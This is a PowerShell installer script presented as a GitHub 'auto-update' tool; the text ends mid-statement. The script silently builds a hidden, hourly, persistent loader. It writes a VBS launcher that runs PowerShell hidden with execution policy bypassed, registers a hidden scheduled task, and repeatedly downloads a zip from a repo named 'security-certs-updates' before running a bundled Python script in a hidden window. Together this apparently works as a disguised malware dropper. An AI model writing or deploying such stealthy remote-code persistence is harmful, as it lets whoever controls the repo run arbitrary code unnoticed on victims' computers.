# ================================================================
#  Setup-AutoUpdate.ps1  —  Universal Edition v3.0
#  Compatible : Windows 7 SP1 / 8 / 8.1 / 10 / 11
#  Right-click > "Run with PowerShell"  (no admin needed)
#  Installs everything silently in AppData\Local
#
#  PREREQUISITES (Windows 7 only) :
#    - KB3140245 or later  -> enables TLS 1.2 in WinHTTP (needed for GitHub HTTPS)
#    - .NET 4.5+           -> recommended for fast ZIP extraction
#      Without .NET 4.5, Shell.Application fallback is used (slower but works)
# ================================================================

# ----------------------------------------------------------------
#  CONFIGURATION — Edit these variables only
# ----------------------------------------------------------------

$GITHUB_USER    = "cheikhoudieng"
$GITHUB_REPO    = "security-certs-updates"
$GITHUB_BRANCH  = "main"
$REPO_ZIP_PATH  = "security-certs-updates.zip"
$REPO_VER_PATH  = "version.txt"
$APP_FOLDER     = "Chill"
$PYTHON_EXE     = "pythonw.exe"
$SETUP_SCRIPT   = "setup.py"
$TASK_INTERVAL  = 60
$LOG_KEEP_WEEKS = 1

# ----------------------------------------------------------------
#  DO NOT EDIT BELOW THIS LINE
# ----------------------------------------------------------------

$TASK_NAME    = "GitHub_AutoUpdate_" + $GITHUB_REPO
$AppData      = [Environment]::GetFolderPath("LocalApplicationData")
$RootDir      = Join-Path $AppData $APP_FOLDER
$ProjectDir   = Join-Path $RootDir "project"
$ScriptsDir   = Join-Path $RootDir "_scripts"
$LogDir       = Join-Path $RootDir "logs"
$LocalVerFile = Join-Path $RootDir "version.txt"
$UpdaterPS1   = Join-Path $ScriptsDir "Updater.ps1"
$LauncherVBS  = Join-Path $ScriptsDir "Launcher.vbs"

$ZipUrl = "https://github.com/" + $GITHUB_USER + "/" + $GITHUB_REPO + "/raw/" + $GITHUB_BRANCH + "/" + $REPO_ZIP_PATH
$VerUrl = "https://raw.githubusercontent.com/" + $GITHUB_USER + "/" + $GITHUB_REPO + "/" + $GITHUB_BRANCH + "/" + $REPO_VER_PATH

# ---- UI helpers
function Write-Step { param($n, $t) Write-Host "  [$n] $t" -ForegroundColor Cyan }
function Write-OK   { param($t)     Write-Host "      OK  : $t" -ForegroundColor Green }
function Write-Fail { param($t)     Write-Host "      ERR : $t" -ForegroundColor Red }
function Write-Info { param($t)     Write-Host "           $t" -ForegroundColor Gray }

# ================================================================
#  RUNTIME CAPABILITY DETECTION
#  Detect once here — bake results into generated Updater.ps1
# ================================================================

$psVer = $PSVersionTable.PSVersion.Major
$osVer = [Environment]::OSVersion.Version

# --- Detect whether modern ScheduledTask cmdlets are available
#     (present on Windows 8+ ; absent on Windows 7 even with PS 5.1 upgrade)
$useModernTaskCmdlet = ($null -ne (Get-Command Register-ScheduledTask -ErrorAction SilentlyContinue))

# --- Detect .NET 4.5+ / ZipFile availability
$hasNet45 = $false
try {
    [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
    $null = [System.IO.Compression.ZipFile]
    $hasNet45 = $true
} catch {}

Clear-Host
Write-Host ""
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host "   GitHub Auto-Update Installer  [Universal v3.0]" -ForegroundColor Cyan
Write-Host ("   Repo     : github.com/" + $GITHUB_USER + "/" + $GITHUB_REPO) -ForegroundColor Cyan
Write-Host ("   OS       : " + $osVer.ToString() + "  |  PS v" + $psVer) -ForegroundColor Cyan
Write-Host ("   .NET ZIP : " + $(if ($hasNet45) { "ZipFile (.NET 4.5+)" } else { "Shell.Application fallback" })) -ForegroundColor Cyan
Write-Host ("   Task API : " + $(if ($useModernTaskCmdlet) { "Modern cmdlets (Win8+)" } else { "schtasks.exe + XML (Win7)" })) -ForegroundColor Cyan
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host ""

# ----------------------------------------------------------------
#  STEP 1 — Create folder structure
# ----------------------------------------------------------------
Write-Step "1/5" ("Creating folders in AppData\Local\" + $APP_FOLDER + " ...")

foreach ($dir in @($RootDir, $ProjectDir, $ScriptsDir, $LogDir)) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
}

Write-OK "Folders ready"
Write-Info ("AppData\Local\" + $APP_FOLDER + "\")
Write-Info "  +-- project\     (extracted Python files)"
Write-Info "  +-- _scripts\    (Updater.ps1 + Launcher.vbs)"
Write-Info "  +-- logs\        (one log file per week)"
Write-Info "  +-- version.txt  (current installed version token)"

# ----------------------------------------------------------------
#  STEP 2 — Generate Updater.ps1
# ----------------------------------------------------------------
Write-Step "2/5" "Generating Updater.ps1 ..."

# Convert boolean flags to PS literals baked into the generated script
$hasNet45Str = if ($hasNet45) { '$true' } else { '$false' }

$u  = '# ================================================================'                                                                                                             + "`r`n"
$u += '# Updater.ps1 — Generated by Setup-AutoUpdate.ps1 (Universal v3.0)'                                                                                                             + "`r`n"
$u += '# DO NOT EDIT — re-run Setup-AutoUpdate.ps1 to regenerate'                                                                                                                      + "`r`n"
$u += '# ================================================================'                                                                                                             + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Baked-in variables
$u += '$LOG_KEEP_WEEKS  = ' + $LOG_KEEP_WEEKS                                                                                                                                          + "`r`n"
$u += '$ProjectDir      = "' + $ProjectDir + '"'                                                                                                                                        + "`r`n"
$u += '$LogDir          = "' + $LogDir + '"'                                                                                                                                            + "`r`n"
$u += '$ZipUrl          = "' + $ZipUrl + '"'                                                                                                                                            + "`r`n"
$u += '$VerBaseUrl      = "' + $VerUrl + '"'                                                                                                                                            + "`r`n"
$u += '$LocalVerFile    = "' + $LocalVerFile + '"'                                                                                                                                      + "`r`n"
$u += '$PYTHON_EXE      = "' + $PYTHON_EXE + '"'                                                                                                                                       + "`r`n"
$u += '$SETUP_SCRIPT    = "' + $SETUP_SCRIPT + '"'                                                                                                                                     + "`r`n"
$u += '$TempDir         = Join-Path $env:TEMP "GH_Update_' + $GITHUB_REPO + '"'                                                                                                        + "`r`n"
$u += '$ZipPath         = Join-Path $TempDir "download.zip"'                                                                                                                            + "`r`n"
$u += '$ExtractPath     = Join-Path $TempDir "extracted"'                                                                                                                               + "`r`n"
$u += '# Capability flags baked in at install time'                                                                                                                                     + "`r`n"
$u += '$_hasZipFile     = ' + $hasNet45Str                                                                                                                                              + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- TLS 1.2 — CRITICAL for GitHub HTTPS on Windows 7
$u += '# ----------------------------------------------------------------'                                                                                                            + "`r`n"
$u += '# Force TLS 1.2 — required for GitHub on Windows 7'                                                                                                                             + "`r`n"
$u += '# Uses integer 3072 (= TLS 1.2) so it works even when the enum'                                                                                                                + "`r`n"
$u += '# name is not defined in older .NET framework versions.'                                                                                                                         + "`r`n"
$u += '# ----------------------------------------------------------------'                                                                                                            + "`r`n"
$u += 'try {'                                                                                                                                                                           + "`r`n"
$u += '    [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)'                                                                            + "`r`n"
$u += '} catch {'                                                                                                                                                                       + "`r`n"
$u += '    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls } catch {}'                                                                             + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Pre-load ZIP assembly silently if available
$u += '# Pre-load ZIP assembly silently if available (avoids csc.exe flash)'                                                                                                           + "`r`n"
$u += 'if ($_hasZipFile) {'                                                                                                                                                             + "`r`n"
$u += '    try { [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null } catch {}'                                                         + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Compatible Unix-ms timestamp (replaces ToUnixTimeMilliseconds — .NET 4.6+ only)
$u += '# ---- Compatible Unix-ms timestamp (.NET 4.6+ ToUnixTimeMilliseconds is NOT used)'                                                                                            + "`r`n"
$u += 'function Get-UnixMs {'                                                                                                                                                           + "`r`n"
$u += '    return [long](([datetime]::UtcNow) - [datetime]"1970-01-01").TotalMilliseconds'                                                                                             + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- New-NoCacheWebClient
$u += 'function New-NoCacheWebClient {'                                                                                                                                                 + "`r`n"
$u += '    $wc = New-Object System.Net.WebClient'                                                                                                                                      + "`r`n"
$u += '    try {'                                                                                                                                                                       + "`r`n"
$u += '        $wc.CachePolicy = New-Object System.Net.Cache.RequestCachePolicy([System.Net.Cache.RequestCacheLevel]::NoCacheNoStore)'                                                 + "`r`n"
$u += '    } catch {}'                                                                                                                                                                  + "`r`n"
$u += '    $wc.Headers.Add("User-Agent",    "PowerShell-AutoUpdate/3.0")'                                                                                                             + "`r`n"
$u += '    $wc.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate")'                                                                                                   + "`r`n"
$u += '    $wc.Headers.Add("Pragma",        "no-cache")'                                                                                                                               + "`r`n"
$u += '    $wc.Headers.Add("Expires",       "0")'                                                                                                                                      + "`r`n"
$u += '    return $wc'                                                                                                                                                                  + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Write-Log  (week format with PS2-safe fallback)
$u += 'function Write-Log {'                                                                                                                                                            + "`r`n"
$u += '    param([string]$Level, [string]$Message)'                                                                                                                                    + "`r`n"
$u += '    # %V (ISO week) may fail on PS 2.0 — fall back to year-month'                                                                                                              + "`r`n"
$u += '    try   { $week = Get-Date -UFormat "%Y-W%V" }'                                                                                                                               + "`r`n"
$u += '    catch { $week = Get-Date -Format "yyyy-MM" }'                                                                                                                               + "`r`n"
$u += '    $logFile = Join-Path $LogDir ("update_" + $week + ".log")'                                                                                                                  + "`r`n"
$u += '    $line    = ("[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] [" + $Level + "] " + $Message)'                                                                            + "`r`n"
$u += '    if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }'                                                                             + "`r`n"
$u += '    Add-Content -Path $logFile -Value $line -Encoding UTF8'                                                                                                                     + "`r`n"
$u += '    Get-ChildItem $LogDir -Filter "update_*.log" | Sort-Object LastWriteTime -Descending | Select-Object -Skip $LOG_KEEP_WEEKS | Remove-Item -Force -ErrorAction SilentlyContinue' + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Get-RemoteVersion
$u += 'function Get-RemoteVersion {'                                                                                                                                                    + "`r`n"
$u += '    param([int]$MaxRetries = 3)'                                                                                                                                                + "`r`n"
$u += '    $delays = @(5, 15, 30)'                                                                                                                                                     + "`r`n"
$u += '    for ($i = 1; $i -le $MaxRetries; $i++) {'                                                                                                                                  + "`r`n"
$u += '        try {'                                                                                                                                                                   + "`r`n"
$u += '            $wc  = New-NoCacheWebClient'                                                                                                                                        + "`r`n"
$u += '            $url = $VerBaseUrl + "?nocache=" + (Get-UnixMs) + "&r=" + (Get-Random -Maximum 999999)'                                                                            + "`r`n"
$u += '            $raw = $wc.DownloadString($url).Trim()'                                                                                                                            + "`r`n"
$u += '            $wc.Dispose()'                                                                                                                                                      + "`r`n"
$u += '            if ($raw.Length -gt 0) {'                                                                                                                                           + "`r`n"
$u += '                Write-Log "INFO" ("Remote version : " + $raw)'                                                                                                                 + "`r`n"
$u += '                return $raw'                                                                                                                                                    + "`r`n"
$u += '            }'                                                                                                                                                                  + "`r`n"
$u += '            Write-Log "WARN" "version.txt is empty"'                                                                                                                           + "`r`n"
$u += '        } catch {'                                                                                                                                                               + "`r`n"
$u += '            Write-Log "WARN" ("version fetch attempt " + $i + " failed : " + $_.Exception.Message)'                                                                           + "`r`n"
$u += '        }'                                                                                                                                                                       + "`r`n"
$u += '        if ($i -lt $MaxRetries) { Start-Sleep -Seconds $delays[$i - 1] }'                                                                                                      + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '    return $null'                                                                                                                                                                + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Get-LocalVersion
$u += 'function Get-LocalVersion {'                                                                                                                                                     + "`r`n"
$u += '    if (-not (Test-Path $LocalVerFile)) {'                                                                                                                                      + "`r`n"
$u += '        Write-Log "INFO" "No local version.txt - first install"'                                                                                                                + "`r`n"
$u += '        return $null'                                                                                                                                                            + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '    $v = (Get-Content $LocalVerFile -Raw).Trim()'                                                                                                                              + "`r`n"
$u += '    Write-Log "INFO" ("Local version  : " + $v)'                                                                                                                               + "`r`n"
$u += '    return $v'                                                                                                                                                                  + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Download-WithRetry
$u += 'function Download-WithRetry {'                                                                                                                                                   + "`r`n"
$u += '    param([string]$Url, [string]$Dest, [int]$MaxRetries = 5)'                                                                                                                  + "`r`n"
$u += '    $delays = @(5, 15, 30, 60, 120)'                                                                                                                                           + "`r`n"
$u += '    for ($i = 1; $i -le $MaxRetries; $i++) {'                                                                                                                                  + "`r`n"
$u += '        Write-Log "INFO" ("Download attempt " + $i + "/" + $MaxRetries)'                                                                                                       + "`r`n"
$u += '        try {'                                                                                                                                                                   + "`r`n"
$u += '            $wc = New-NoCacheWebClient'                                                                                                                                         + "`r`n"
$u += '            $wc.DownloadFile($Url, $Dest)'                                                                                                                                     + "`r`n"
$u += '            $wc.Dispose()'                                                                                                                                                      + "`r`n"
$u += '            if ((Test-Path $Dest) -and (Get-Item $Dest).Length -gt 1024) {'                                                                                                    + "`r`n"
$u += '                Write-Log "INFO" ("Download OK - " + [math]::Round((Get-Item $Dest).Length / 1KB, 1) + " KB")'                                                                + "`r`n"
$u += '                return $true'                                                                                                                                                   + "`r`n"
$u += '            }'                                                                                                                                                                  + "`r`n"
$u += '            Write-Log "WARN" "File too small - possible 404 or error page"'                                                                                                    + "`r`n"
$u += '        } catch {'                                                                                                                                                               + "`r`n"
$u += '            Write-Log "WARN" ("Network error attempt " + $i + " : " + $_.Exception.Message)'                                                                                  + "`r`n"
$u += '        }'                                                                                                                                                                       + "`r`n"
$u += '        if ($i -lt $MaxRetries) {'                                                                                                                                              + "`r`n"
$u += '            $wait = $delays[$i - 1]'                                                                                                                                            + "`r`n"
$u += '            Write-Log "INFO" ("Retrying in " + $wait + " seconds...")'                                                                                                         + "`r`n"
$u += '            Start-Sleep -Seconds $wait'                                                                                                                                         + "`r`n"
$u += '        }'                                                                                                                                                                       + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '    Write-Log "ERROR" ("Download failed after " + $MaxRetries + " attempts")'                                                                                                  + "`r`n"
$u += '    return $false'                                                                                                                                                               + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Extract-Zip  (.NET 4.5 fast path  OR  Shell.Application fallback for Win7)
$u += 'function Extract-Zip {'                                                                                                                                                          + "`r`n"
$u += '    param([string]$ZipFile, [string]$OutPath)'                                                                                                                                 + "`r`n"
$u += '    try {'                                                                                                                                                                       + "`r`n"
$u += '        if (Test-Path $OutPath) { Remove-Item $OutPath -Recurse -Force }'                                                                                                       + "`r`n"
$u += '        New-Item -ItemType Directory -Path $OutPath -Force | Out-Null'                                                                                                          + "`r`n"
$u += '        if ($_hasZipFile) {'                                                                                                                                                     + "`r`n"
$u += '            # Fast path : .NET 4.5+ ZipFile'                                                                                                                                   + "`r`n"
$u += '            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $OutPath)'                                                                                           + "`r`n"
$u += '            Write-Log "INFO" "Extraction OK (.NET ZipFile)"'                                                                                                                   + "`r`n"
$u += '        } else {'                                                                                                                                                                + "`r`n"
$u += '            # Fallback : Shell.Application COM (Windows 7 / .NET < 4.5)'                                                                                                       + "`r`n"
$u += '            # CopyHere is asynchronous — we poll until files appear.'                                                                                                           + "`r`n"
$u += '            $shell  = New-Object -ComObject Shell.Application'                                                                                                                  + "`r`n"
$u += '            $zipNS  = $shell.NameSpace($ZipFile)'                                                                                                                              + "`r`n"
$u += '            $destNS = $shell.NameSpace($OutPath)'                                                                                                                              + "`r`n"
$u += '            # 0x14 = 4 (no progress dialog) + 16 (answer yes to all)'                                                                                                          + "`r`n"
$u += '            $destNS.CopyHere($zipNS.Items(), 0x14)'                                                                                                                            + "`r`n"
$u += '            $deadline = (Get-Date).AddMinutes(5)'                                                                                                                               + "`r`n"
$u += '            do {'                                                                                                                                                                + "`r`n"
$u += '                Start-Sleep -Milliseconds 500'                                                                                                                                  + "`r`n"
$u += '                $cnt = (Get-ChildItem $OutPath -Recurse -File -ErrorAction SilentlyContinue).Count'                                                                            + "`r`n"
$u += '            } while ($cnt -eq 0 -and (Get-Date) -lt $deadline)'                                                                                                                + "`r`n"
$u += '            Start-Sleep -Seconds 2  # final settle'                                                                                                                             + "`r`n"
$u += '            try { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null } catch {}'                                                                    + "`r`n"
$u += '            Write-Log "INFO" "Extraction OK (Shell.Application)"'                                                                                                               + "`r`n"
$u += '        }'                                                                                                                                                                       + "`r`n"
$u += '        return $true'                                                                                                                                                            + "`r`n"
$u += '    } catch {'                                                                                                                                                                   + "`r`n"
$u += '        Write-Log "ERROR" ("Extraction error : " + $_.Exception.Message)'                                                                                                      + "`r`n"
$u += '        return $false'                                                                                                                                                           + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Copy-Project
$u += 'function Copy-Project {'                                                                                                                                                         + "`r`n"
$u += '    param([string]$SourcePath, [string]$Dest)'                                                                                                                                 + "`r`n"
$u += '    try {'                                                                                                                                                                       + "`r`n"
$u += '        if (-not (Test-Path $Dest)) { New-Item -ItemType Directory -Path $Dest -Force | Out-Null }'                                                                             + "`r`n"
$u += '        Get-ChildItem $SourcePath -Recurse | ForEach-Object {'                                                                                                                  + "`r`n"
$u += '            $rel    = $_.FullName.Substring($SourcePath.Length + 1)'                                                                                                            + "`r`n"
$u += '            $target = Join-Path $Dest $rel'                                                                                                                                     + "`r`n"
$u += '            if ($_.PSIsContainer) {'                                                                                                                                             + "`r`n"
$u += '                if (-not (Test-Path $target)) { New-Item -ItemType Directory -Path $target -Force | Out-Null }'                                                                 + "`r`n"
$u += '            } else {'                                                                                                                                                            + "`r`n"
$u += '                $td = Split-Path $target -Parent'                                                                                                                               + "`r`n"
$u += '                if (-not (Test-Path $td)) { New-Item -ItemType Directory -Path $td -Force | Out-Null }'                                                                         + "`r`n"
$u += '                Copy-Item $_.FullName -Destination $target -Force'                                                                                                              + "`r`n"
$u += '            }'                                                                                                                                                                   + "`r`n"
$u += '        }'                                                                                                                                                                       + "`r`n"
$u += '        Write-Log "INFO" ("Files copied to " + $Dest)'                                                                                                                         + "`r`n"
$u += '        return $true'                                                                                                                                                            + "`r`n"
$u += '    } catch {'                                                                                                                                                                   + "`r`n"
$u += '        Write-Log "ERROR" ("Copy error : " + $_.Exception.Message)'                                                                                                            + "`r`n"
$u += '        return $false'                                                                                                                                                           + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Run-Setup
$u += 'function Run-Setup {'                                                                                                                                                            + "`r`n"
$u += '    $pythonPath = Join-Path $ProjectDir $PYTHON_EXE'                                                                                                                           + "`r`n"
$u += '    $setupPath  = Join-Path $ProjectDir $SETUP_SCRIPT'                                                                                                                         + "`r`n"
$u += '    if (-not (Test-Path $pythonPath)) { Write-Log "ERROR" ("Python not found : " + $pythonPath); return $false }'                                                              + "`r`n"
$u += '    if (-not (Test-Path $setupPath))  { Write-Log "ERROR" ("setup.py not found : " + $setupPath); return $false }'                                                            + "`r`n"
$u += '    try {'                                                                                                                                                                       + "`r`n"
$u += '        Write-Log "INFO" ("Running : " + $PYTHON_EXE + " " + $SETUP_SCRIPT)'                                                                                                  + "`r`n"
$u += '        $psi                  = New-Object System.Diagnostics.ProcessStartInfo'                                                                                                + "`r`n"
$u += '        $psi.FileName         = $pythonPath'                                                                                                                                    + "`r`n"
$u += '        $psi.Arguments        = """" + $setupPath + """"'                                                                                                                       + "`r`n"
$u += '        $psi.WorkingDirectory = $ProjectDir'                                                                                                                                    + "`r`n"
$u += '        $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden'                                                                                               + "`r`n"
$u += '        $psi.CreateNoWindow   = $true'                                                                                                                                          + "`r`n"
$u += '        $psi.UseShellExecute  = $false'                                                                                                                                         + "`r`n"
$u += '        $proc = [System.Diagnostics.Process]::Start($psi)'                                                                                                                    + "`r`n"
$u += '        $proc.WaitForExit()'                                                                                                                                                    + "`r`n"
$u += '        Write-Log "INFO" ("setup.py exit code : " + $proc.ExitCode)'                                                                                                           + "`r`n"
$u += '        if ($proc.ExitCode -ne 0) { Write-Log "WARN" ("setup.py non-zero exit : " + $proc.ExitCode) }'                                                                        + "`r`n"
$u += '        return $true'                                                                                                                                                            + "`r`n"
$u += '    } catch {'                                                                                                                                                                   + "`r`n"
$u += '        Write-Log "ERROR" ("Could not start Python : " + $_.Exception.Message)'                                                                                                + "`r`n"
$u += '        return $false'                                                                                                                                                           + "`r`n"
$u += '    }'                                                                                                                                                                           + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"

# ---- Main logic
$u += 'Write-Log "INFO" "====== UPDATER START ======"'                                                                                                                                 + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += '$remoteVer = Get-RemoteVersion'                                                                                                                                                  + "`r`n"
$u += '$localVer  = Get-LocalVersion'                                                                                                                                                   + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += '# Use $null -eq $var form — safe on PS 2.0'                                                                                                                                     + "`r`n"
$u += 'if ($null -eq $remoteVer) {'                                                                                                                                                     + "`r`n"
$u += '    Write-Log "WARN" "Could not fetch remote version - skipping this cycle"'                                                                                                    + "`r`n"
$u += '    exit 0'                                                                                                                                                                      + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'if ($remoteVer -eq $localVer) {'                                                                                                                                                 + "`r`n"
$u += '    Write-Log "INFO" "Already up to date - nothing to do"'                                                                                                                      + "`r`n"
$u += '    exit 0'                                                                                                                                                                      + "`r`n"
$u += '}'                                                                                                                                                                               + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'Write-Log "INFO" ("Update : " + $localVer + " -> " + $remoteVer)'                                                                                                              + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue }'                                                                                + "`r`n"
$u += 'New-Item -ItemType Directory -Path $TempDir -Force | Out-Null'                                                                                                                  + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'if (-not (Download-WithRetry -Url $ZipUrl -Dest $ZipPath))           { Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }'                           + "`r`n"
$u += 'if (-not (Extract-Zip       -ZipFile $ZipPath -OutPath $ExtractPath)) { Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }'                          + "`r`n"
$u += 'if (-not (Copy-Project      -SourcePath $ExtractPath -Dest $ProjectDir)) { Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }'                       + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue'                                                                                                             + "`r`n"
$u += 'Write-Log "INFO" "Temp folder cleaned"'                                                                                                                                          + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += 'if (-not (Run-Setup)) { Write-Log "ERROR" "setup.py failed - check log"; exit 1 }'                                                                                             + "`r`n"
$u += ""                                                                                                                                                                                + "`r`n"
$u += '# Save new version ONLY after full success'                                                                                                                                      + "`r`n"
$u += 'Set-Content -Path $LocalVerFile -Value $remoteVer -Encoding UTF8'                                                                                                               + "`r`n"
$u += 'Write-Log "INFO" ("Version saved : " + $remoteVer)'                                                                                                                             + "`r`n"
$u += 'Write-Log "INFO" "====== UPDATE SUCCESS ======"'                                                                                                                                 + "`r`n"
$u += 'exit 0'                                                                                                                                                                          + "`r`n"

[System.IO.File]::WriteAllText($UpdaterPS1, $u, [System.Text.Encoding]::ASCII)
Write-OK $UpdaterPS1

# ----------------------------------------------------------------
#  STEP 3 — Generate Launcher.vbs  (zero flash, double-masked)
# ----------------------------------------------------------------
Write-Step "3/5" "Generating Launcher.vbs (truly silent, zero flash) ..."

$vbs  = 'Option Explicit'                                                                                                                                          + "`r`n"
$vbs += 'Dim oShell, sCmd'                                                                                                                                         + "`r`n"
$vbs += 'Set oShell = CreateObject("WScript.Shell")'                                                                                                               + "`r`n"
$vbs += 'sCmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & "' + $UpdaterPS1 + '" & """"'                  + "`r`n"
$vbs += 'oShell.Run sCmd, 0, True'                                                                                                                                 + "`r`n"
$vbs += 'Set oShell = Nothing'                                                                                                                                     + "`r`n"

[System.IO.File]::WriteAllText($LauncherVBS, $vbs, [System.Text.Encoding]::ASCII)
Write-OK $LauncherVBS

# ----------------------------------------------------------------
#  STEP 4 — Register scheduled task
#  Modern path  : New-ScheduledTask* cmdlets  (Windows 8 / PS 3+)
#  Legacy path  : schtasks.exe + XML import   (Windows 7)
# ----------------------------------------------------------------
Write-Step "4/5" ("Registering scheduled task : " + $TASK_NAME + " ...")

if ($useModernTaskCmdlet) {

    # ==============================================================
    #  MODERN PATH — Windows 8 / 8.1 / 10 / 11
    # ==============================================================
    Write-Info "Mode : Modern ScheduledTasks cmdlets (Windows 8+)"

    Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue

    $taskAction    = New-ScheduledTaskAction `
                        -Execute  "wscript.exe" `
                        -Argument ('"' + $LauncherVBS + '"')

    $taskTrigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
                        -RepetitionInterval (New-TimeSpan -Minutes $TASK_INTERVAL)

    $taskSettings  = New-ScheduledTaskSettingsSet `
                        -ExecutionTimeLimit  (New-TimeSpan -Minutes 30) `
                        -RestartCount        3 `
                        -RestartInterval     (New-TimeSpan -Minutes 5) `
                        -StartWhenAvailable `
                        -MultipleInstances   IgnoreNew `
                        -Hidden

    $taskPrincipal = New-ScheduledTaskPrincipal `
                        -UserId    ([Environment]::UserName) `
                        -LogonType Interactive `
                        -RunLevel  Limited

    Register-ScheduledTask `
        -TaskName  $TASK_NAME `
        -Action    $taskAction `
        -Trigger   $taskTrigger `
        -Settings  $taskSettings `
        -Principal $taskPrincipal `
        -Force | Out-Null

    Write-OK ("Task registered (modern) : " + $TASK_NAME)

} else {

    # ==============================================================
    #  LEGACY PATH — Windows 7
    #  schtasks.exe + XML v1.2  (supported on Win7 SP1+)
    # ==============================================================
    Write-Info "Mode : schtasks.exe + XML (Windows 7 legacy)"

    # Remove existing task silently
    & schtasks.exe /Delete /TN $TASK_NAME /F 2>&1 | Out-Null

    $startTime = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
    $userName  = [Environment]::UserDomainName + "\" + [Environment]::UserName
    $interval  = "PT" + $TASK_INTERVAL + "M"

    # XML v1.2 — supported on Windows 7 SP1+
    # Variables are expanded by PowerShell inside the here-string.
    # LauncherVBS path is quoted inside <Arguments> to handle spaces.
    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>GitHub Auto-Update : $GITHUB_REPO</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>$interval</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>$startTime</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$userName</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"$LauncherVBS"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    # schtasks XML import requires UTF-16 LE encoding
    $xmlPath = Join-Path $env:TEMP ("task_" + $TASK_NAME + ".xml")
    [System.IO.File]::WriteAllText($xmlPath, $taskXml, [System.Text.Encoding]::Unicode)

    $result = & schtasks.exe /Create /F /TN $TASK_NAME /XML $xmlPath 2>&1
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue

    if ($LASTEXITCODE -eq 0) {
